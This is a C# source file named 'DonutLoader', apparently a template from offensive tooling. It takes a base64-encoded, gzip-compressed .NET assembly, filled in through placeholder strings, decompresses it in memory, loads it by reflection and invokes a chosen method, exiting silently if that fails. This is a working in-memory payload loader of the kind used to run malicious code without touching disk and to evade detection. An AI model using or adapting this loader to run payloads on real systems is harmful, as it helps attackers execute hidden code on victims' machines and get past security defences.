using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;

class DonutLoader
{
    static string payload64 = @"#COMPRESSEDASSEMBLY#";
    static string type = "#TYPE#";
    static string method = "#METHOD#";

    static void Main(string[] args)
    {
        System.Reflection.Assembly a = System.Reflection.Assembly.Load(getPayload(payload64));
        Type assemblyType = a.GetType(type);
        object assemblyObject = Activator.CreateInstance(assemblyType);

        try
        {
            assemblyType.InvokeMember(method, System.Reflection.BindingFlags.InvokeMethod | System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.Instance |
            System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.IgnoreReturn, null, assemblyObject, new object[1] { args });
        }
        catch (System.Exception)
        {
            Environment.Exit(1);
        }

        Environment.Exit(0);

    }

    public static byte[] getPayload(string payload)
    {

        return DecompressDLL(Convert.FromBase64String(payload));
    }

    public static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }
}

